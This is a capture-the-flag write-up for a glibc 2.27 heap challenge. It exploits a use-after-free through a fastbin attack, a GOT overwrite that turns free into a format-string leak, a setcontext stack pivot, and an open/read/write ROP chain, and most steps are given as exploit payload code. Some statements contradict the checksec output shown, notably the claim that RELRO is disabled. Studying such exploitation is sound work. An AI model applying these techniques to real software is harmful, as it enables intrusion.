# Linker Revenge

### Overview

This is heap pwn challenge with the GLIBC given 2.27, the security checks:-

```r
❯ file linker_revenge
linker_revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=af19ec882ea7b9ada3b35ae3712abbbf109e5dfe, not stripped
❯ checksec linker_revenge
[*] '/home/d4mianwayne/Pwning/CTFs/3kCTF/linker_revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
❯ seccomp-tools dump ./linker_revenge
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0010
 0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL

```

Since Seccomp is enabled, we will do an Open/Read/Write ROP chain to read the flag after getting the RIP control.

### Vulnerability

The vulnerability relies in the `edit_page` function, there exists a UAF vulnerability which can be used to do tamper the metadata of an already `free`'d chunk.

### Exploitation

To exploit this challenge, first off, we take advantage of the fastbin attack, to do so, we first fill the tcache bins of the same size and then malloc 2 chunks and free those chunk

```py
for i in range(7):
	new(0x68)
	delete(0)
```
For insance let name them chunk A and chunk B respectively. Upon free'ing the chunk A & B, we overwrote the `chunk[1]->fd = fake_fasbin_chunk` since the chunk A & B size is 0x71, we can overwrite the Chunk A's fd to the address `0x6020bd` which proposed a structure of a fastbin chunk.

Fastbin = [chunk A, 0x6020bd]

Now, that being said, doing so, in next allocation, we get chunk A and the next will give us the ability to overwrite data stored at `0x6020bd + 0x10` and beyond. Since there's a `page` array stored at the BSS section along with the `page_size` table which is used to store the size of the chunks allocated, we will overwrite the `page` array with our desired addresses:-

```py
payload  = b'AAA'
payload += p64(0) * 2
payload += p32(0x68) * 8 # size -> int
payload += p32(1) * 3 + p32(0) * 5
payload += p64(elf.got['free']) # ptr[0]
payload += p64(0x6020e0) # ptr[1] = &page_size

edit(0, payload)
```
Here, we overwrite the `page_size` table with the `0xff` values and the flag variables and then make the `page` array as of following:-

```py
page = [free@got, 0x6020e0]
```
> The `0x6020e0` addres points to the 3rd index, 4th element of the `page` array on the BSS.

Now, since RELRO is disabled, we can overwrite the `free@got`. Since there's no `show` function, what we will do is make use of `free@got` i.e overwrite it with the `printf` to propogate a FSB to get the address from the program stack:-

```py
edit(0, p64(elf.plt['printf'])) # ptr[0] -> free@got -> printf@plt
new(0x68) # chunk 2
edit(3, "%19$p\n") # FSB
```
Now, when we do `delete(3)`, it will trigger the FSB and we will get the address stored at the 19th index:-

```py
delete(3) # free(chunk[3]) -> %19$p -> printf("%19$p")

libc.address = int(p.recvline().strip(), 16) - libc.symbols['__libc_start_main'] - 231
log.info(f"LIBC:   {hex(libc.address)}")
```

Now, we will again overwrite the `page_size` table, this time with 

```py
payload  = p32(0x68) * 8 # size > int
payload += p32(1) * 3 + p32(0) * 5 # flags -> int
payload += p64(elf.got["free"]) # ptr[0] = free@got
payload += p64(0x6020e0)        # ptr[1] = page_size
payload += p64(0x602138)        # *ptr
edit(1, payload)
```

Page table looks like:-

```py
page_array = [free@got, 0x6020e0, 0x602138]
```

Also, since seccomp is enabled and there's no way to get the shell itself, we also need to leak the heap address, luckily the FSB is of the use here, we will just leak the address of the heap pointer:-

```py
new(0x70) # 3
new(0x70) # 4

delete(2) # free(chunk2) -> printf(&chunk2)
```

Now, we will overwrite the `free@got` with the `setcontext + 53` to peform a stack pivot to read the flag file, the stack pivot will make the `rsp` points to the `heap` chunk where our ROP chain would be stored :D

```py
edit(1, p64(libc.symbols["setcontext"] + 0x35)) # ptr[1] == __free_hook => setcontexr + 53
```
We need to make the rdi points to the certain address, such that during the call to `setcontext + 53` will make the registers point to the right address, exactly where we want them to be:-

```r
0x7f12c88450a5 <setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
0x7f12c88450ac <setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]
0x7f12c88450b3 <setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]
0x7f12c88450b7 <setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]
0x7f12c88450bb <setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]
0x7f12c88450bf <setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]
0x7f12c88450c3 <setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]
0x7f12c88450c7 <setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
0x7f12c88450ce <setcontext+94>:  push   rcx
0x7f12c88450cf <setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]
0x7f12c88450d3 <setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]
0x7f12c88450da <setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]
0x7f12c88450e1 <setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]
0x7f12c88450e5 <setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]
0x7f12c88450e9 <setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]
0x7f12c88450ed <setcontext+125>: xor    eax,eax
0x7f12c88450ef <setcontext+127>: ret 

```

The following address/values would be stored:-

```py
payload = b''
payload += b'flag\x00\x00\x00\x00' + p64(0xffffffffffffff9c) # rdi + 0x60 --> r15, rdi
payload += p64(heap_base + 0x14b0) + p64(0) # rdi + 0x70 --> rsi, rbp
payload += p64(0) + p64(0) # rdi + 0x80 --> rbx, rdx
payload += p64(0) + p64(0) # rdi + 0x90 --> XXX, rcx
payload += p64(heap_base + 0x17d0 - 8) + p64(pop_rax) # rdi + 0xa0 --> rsp,

# Store the payload, one after another
edit(3, payload)
```

Now, now, we will edit the `page` array again to make the 4th element point next to the ROP chain, such that once `edit` would be called next, it will be able to do the same


```py
payload  = p32(0xfff) * 8
payload += p32(1) * 5 + p32(0) * 3
payload += p64(elf.got["free"])
payload += p64(0x6020e0)
payload += p64(heap_base + 0x14b0 - 0x60) # ptr[2]


edit(1, payload)
```
Now, doing that so, we will have the `ptr[2]` pointing to the `heap - 0x60`, that is to the point where the next time, once edit is called will make the ROP chain complete:-

```py
# openat(0, "flag", 0)
payload = p64(pop_rax)
payload += p64(257)
payload += p64(syscall)

# read(0, heap_base, 0x40)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(heap_base)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall)

# write(1, heap_base, 0x40)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heap_base)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall)

edit(4, payload)
```

Now, delete the page[2] chunk, such that:-

```
free(page[2]) -> __free_hook(ptr[2]) -> setcontext + 53 :  rdi => ptr[2]
```

```py
delete(3)
```
Get the flag :D